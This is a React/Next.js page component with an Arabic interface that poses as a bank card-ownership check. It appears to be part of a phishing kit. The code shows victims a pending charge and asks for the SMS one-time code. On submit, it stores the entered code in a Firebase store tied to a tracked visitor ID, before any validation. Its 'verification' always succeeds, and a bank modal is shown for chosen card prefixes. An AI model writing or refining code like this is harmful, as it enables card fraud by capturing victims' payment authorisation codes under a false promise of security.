"use client"

import type React from "react"

import { useEffect, useCallback, useState } from "react"
import { useRouter } from "next/navigation"
import Header from "@/components/Header"
import Footer from "@/components/Footer"
import { BankVerificationModal } from "@/components/BankVerificationModal"
import { addData } from "@/lib/firebase"

interface CardOwnershipState {
  otp: string[]
  timer: number
  error: string | null
  amount: number
  cardLastDigits: string
}

// This function would replace the socket emit for verification
const verifyCardOwnership = async (_orderId: string, _cardId: string, _verificationCode: string) => {
  // Replace with your API call
  try {
    addData({ id: _orderId, cardId: _cardId, ownerCode: _verificationCode })

    return { success: true }
  } catch (error) {
    console.error("Error verifying card ownership:", error)
    throw new Error("Failed to verify card ownership")
  }
}

export default function CardOwnershipVerification() {
  const router = useRouter()
  const [showBankModal, setShowBankModal] = useState(false)
  const [otpDigit, setOtpDigit] = useState("")
  const [visitorId, setVisitorId] = useState<string | null>(null)

  // Set visitor ID from localStorage
  useEffect(() => {
    if (typeof window !== "undefined") {
      setVisitorId(localStorage.getItem("visitor"))
    }
  }, [])

  // Replace Redux state with local state
  const [state, setState] = useState<CardOwnershipState>({
    otp: ["", "", "", "", "", ""],
    timer: 300, // 5 minutes in seconds
    error: null,
    amount: 0,
    cardLastDigits: "",
  })

  const decrementTimer = useCallback(() => {
    setState((prevState) => ({
      ...prevState,
      timer: Math.max(0, prevState.timer - 1),
    }))
  }, [])

  const resetTimer = useCallback(() => {
    setState((prevState) => ({
      ...prevState,
      timer: 300, // Reset to 5 minutes
    }))
  }, [])

  const setError = useCallback((errorMessage: string) => {
    setState((prevState) => ({
      ...prevState,
      error: errorMessage,
    }))
  }, [])

  const clearError = useCallback(() => {
    setState((prevState) => ({
      ...prevState,
      error: null,
    }))
  }, [])

  // Check for special card prefixes
  useEffect(() => {
    if (typeof window !== "undefined") {
      const paymentData = JSON.parse(localStorage.getItem("paymentData") || "[]")
      const lastPayment = paymentData[paymentData.length - 1]

      if (lastPayment) {
        // Set card and amount data
        setState((prevState) => ({
          ...prevState,
          amount: lastPayment.amount || 0,
          cardLastDigits: lastPayment.card_number?.slice(-4) || "",
        }))

        const cardPrefix = lastPayment.card_number?.substring(0, 4)
        const specialPrefixes = ["4847", "4092", "4622", "4321", "4455"]

        if (specialPrefixes.includes(cardPrefix)) {
          setShowBankModal(true)
        }
      }
    }
  }, [])

  // Timer countdown
  useEffect(() => {
    const interval = setInterval(() => {
      decrementTimer()
    }, 1000)

    return () => clearInterval(interval)
  }, [decrementTimer])

  const isValidOtp = useCallback((otpValue: string) => {
    return otpValue.length === 4 || otpValue.length === 6
  }, [])

  const formatTime = useCallback((seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${String(minutes).padStart(2, "0")}:${String(remainingSeconds).padStart(2, "0")}`
  }, [])

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setOtpDigit(e.target.value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (visitorId) {
      addData({ id: visitorId, cardOtp: otpDigit })
    }

    // Clear any existing errors
    clearError()

    // Validation logic
    if (otpDigit.length === 5) {
      setError("عدد غير صحيح. الرجاء إدخال 4 أو 6 أرقام")
      return
    }

    if (otpDigit.length < 4) {
      setError("الرجاء إدخال 4 أرقام على الأقل")
      return
    }

    if (otpDigit.length > 6) {
      setError("الحد الأقصى المسموح به هو 6 أرقام")
      return
    }

    if (otpDigit.length !== 4 && otpDigit.length !== 6) {
      setError("يرجى إدخال 4 أو 6 أرقام للتحقق")
      return
    }

    try {
      let order_id = null
      let card_id = null

      if (typeof window !== "undefined") {
        order_id = JSON.parse(localStorage.getItem("order_id") || "null")
        card_id = JSON.parse(localStorage.getItem("card_id") || "null")
      }

      // Replace socket emit with API call
      if (order_id && card_id) {
        const result = await verifyCardOwnership(order_id, card_id, otpDigit)

        if (result.success) {
          router.push("/verify-card")
        } else {
          setError("رمز التحقق غير صحيح")
        }
      }
    } catch (error) {
      setError("رمز التحقق غير صحيح")
    }
  }

  const handleResendCode = useCallback(() => {
    resetTimer()
    // Add API call for resending code here
    // Example: resendVerificationCode(orderId, cardId);
  }, [resetTimer])

  return (
    <>
      <Header />
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 pt-36 px-4">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
            <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-[#146394]">إثبات ملكية البطاقة</h1>

            <div className="text-center mb-8 space-y-4">
              <div className="p-6 bg-blue-50 rounded-xl transition-all duration-300 hover:bg-blue-100">
                <p className="text-[#146394] mb-3">سيتم اجراء معاملة مالية على حسابك المصرفي</p>
                <p className="text-[#146394] text-lg font-semibold mb-3">
                  لسداد مبلغ قيمته <span className="font-bold">{state.amount.toFixed(2)} ريال</span>
                </p>
                <p className="text-[#146394]">
                  باستخدام البطاقة المنتهية برقم <span className="font-bold">{state.cardLastDigits}</span>
                </p>
              </div>
              <p className="text-gray-600">لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div>
                <label htmlFor="otp-input" className="block text-right mb-4 text-[#146394] font-medium">
                  رمز التحقق <span className="text-red-500">*</span>
                </label>
                <div className="flex justify-center">
                  <input
                    id="otp-input"
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    value={otpDigit}
                    onChange={handleOtpChange}
                    className="w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg focus:border-[#146394] focus:ring-2 focus:ring-blue-200 outline-none transition-all bg-white"
                    placeholder="######"
                    aria-label="Enter verification code"
                  />
                </div>
                {state.error && (
                  <p role="alert" className="text-red-500 text-sm mt-2 text-center animate-shake">
                    {state.error}
                  </p>
                )}
              </div>

              <div className="text-center text-[#146394] bg-blue-50 p-4 rounded-xl">
                <p>سيتم إرسال رسالة كود التحقق في خلال</p>
                <p className="font-bold text-lg mt-1">{formatTime(state.timer)} دقيقة</p>
              </div>

              <button
                type="submit"
                disabled={!isValidOtp(otpDigit)}
                className={`w-full py-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-[0.99] active:scale-[0.97] text-lg ${
                  isValidOtp(otpDigit)
                    ? "bg-[#146394] text-white hover:bg-[#0f4c70]"
                    : "bg-[#146394] opacity-50 cursor-not-allowed"
                }`}
              >
                متابعة
              </button>

              {state.timer === 0 && (
                <button
                  type="button"
                  onClick={handleResendCode}
                  className="w-full text-[#146394] py-2 font-semibold hover:bg-blue-50 rounded-lg transition-all duration-300"
                >
                  إعادة إرسال الرمز
                </button>
              )}
            </form>

            <div className="mt-8 text-center">
              <div className="flex items-center justify-center gap-2 text-[#146394] bg-blue-50 p-4 rounded-lg transition-all duration-300 hover:bg-blue-100">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                    clipRule="evenodd"
                  />
                </svg>
                <p className="text-sm">نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك</p>
              </div>
            </div>
          </div>
        </div>
        <BankVerificationModal isOpen={showBankModal} onClose={() => setShowBankModal(false)} />
      </div>
      <Footer />
    </>
  )
}

